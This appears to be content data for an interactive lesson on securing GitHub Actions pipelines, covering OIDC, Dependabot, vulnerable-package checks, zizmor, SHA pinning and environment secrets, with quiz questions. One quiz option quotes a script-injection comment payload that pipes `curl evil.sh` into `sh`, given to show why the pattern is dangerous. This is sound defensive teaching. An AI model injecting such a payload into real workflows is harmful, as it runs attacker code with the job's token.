title: Senior's toolkit: a pipeline you can trust
summary: OIDC instead of stored cloud keys, Dependabot, vulnerable package checks, workflow audits, pinned actions, environment secrets and attestations.

steps.title: Senior's toolkit: a pipeline you can trust
steps.body: A pipeline holds the keys to production, so attackers aim at it. These commands and keys remove long-lived secrets, keep dependencies patched and prove what you built.

toolkit.what: Lets the job ask GitHub for a short-lived OIDC token that the cloud trusts, instead of storing a cloud key as a secret. Nothing long-lived can leak.
Dependabot opens pull requests for outdated or vulnerable dependencies. Include `github-actions` so your actions get updated too.
flags: bundle minor and patch bumps into one PR
toolkit.example:
version: 2
updates:
  - package-ecosystem: nuget
    directory: /
    schedule:
      interval: weekly
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly

toolkit.what: Lists packages with known advisories, including the ones you pull in indirectly. (.NET 10 form; older SDKs use `dotnet list package --vulnerable`.)
flags: dependencies of dependencies, where most issues hide

toolkit.what: A security linter for workflows: script injection from `${{ github.event... }}`, `pull_request_target` misuse, unpinned actions, too-wide permissions.
toolkit.when: on every PR that changes a workflow

toolkit.what: Pins a third-party action to an exact commit. A tag can be moved to malicious code; a SHA cannot. The comment lets Dependabot and humans see the version.
flags: the version the SHA belongs to

toolkit.what: Stores a secret for one environment only, so only jobs that deploy there (after approval) can read it. Reads the value from stdin, keeping it out of shell history.
flags: value from a file instead of `--body`
toolkit.example: gh secret set DB_PASSWORD --env production < db-password.txt

toolkit.what: Checks that an artifact or image was built by your workflow (signed build provenance), before you deploy it.

steps.prompt: A security review finds `AZURE_CLIENT_SECRET` stored as a repository secret, two years old, used by the deploy job. What is the best fix?
options: Switch to OIDC: a federated credential for the environment, `permissions: id-token: write`, `azure/login` with client, tenant and subscription ids; then delete the secret
Move it to an organisation secret
steps.explain: With OIDC the job gets a token that lives for minutes and only works for the subject the cloud trusts. There is no stored credential left to leak or rotate.

steps.prompt: Match the tool to the risk it covers.
pairs: dependencies that silently go out of date
a known CVE in an indirect package
an action's tag moved to malicious code
deploying an image nobody can trace to your build

steps.prompt: Find vulnerable packages, including indirect ones.
steps.explain: `--outdated` and `--deprecated` are real flags too, but they answer different questions. Advisories in transitive packages only show with `--include-transitive`.

steps.prompt: `zizmor` flags this step in a workflow triggered by `issue_comment`: `run: echo "${{ github.event.comment.body }}"`. Why is it dangerous?
options: The expression is pasted into the script before it runs, so a comment like `"; curl evil.sh | sh; "` runs as code with the job's token
Comments can be too long for `echo`
`echo` is not available on the runner
steps.explain: Pass untrusted values through an environment variable instead: `env: BODY: ${{ github.event.comment.body }}` and `run: echo "$BODY"`. Then the shell treats it as data.

items: Required reviewers on the production environment

steps.title: Make it a habit
steps.body: In every new pipeline: default `contents: read`, OIDC for cloud access, secrets scoped to environments, actions pinned by SHA and Dependabot to keep them current. Run `zizmor` and the vulnerable-package check in CI so nobody has to remember.
